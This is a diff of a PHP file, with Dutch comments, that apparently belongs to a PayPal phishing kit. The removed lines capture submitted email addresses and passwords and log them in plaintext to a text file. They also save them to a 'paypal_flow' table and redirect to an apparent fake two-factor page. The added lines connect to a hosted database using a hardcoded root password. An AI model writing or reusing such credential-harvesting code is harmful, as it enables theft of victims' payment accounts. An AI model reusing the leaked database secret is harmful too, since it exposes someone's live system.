@@ -1,32 +1,8 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $email = $_POST['email'] ?? '';
-    $password = $_POST['password'] ?? '';
-file_put_contents("debug_log.txt", "EMAIL: $email | PASS: $password\n", FILE_APPEND);
-
-
-    if (!empty($email) && !empty($password)) {
-        $conn = new mysqli('localhost', 'root', '', 'my_base');
-        if ($conn->connect_error) {
-            die("Connectie mislukt: " . $conn->connect_error);
-        }
-
-        // Sla de gegevens op
-        $stmt = $conn->prepare("INSERT INTO paypal_flow (identifier, password) VALUES (?, ?)");
-        $stmt->bind_param("ss", $email, $password);
-        $stmt->execute();
-
-        // Bewaar het ID in sessie
-        $_SESSION['paypal_id'] = $stmt->insert_id;
-
-        $stmt->close();
-        $conn->close();
-
-        header("Location: payp2fa.php");
-        exit();
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
 
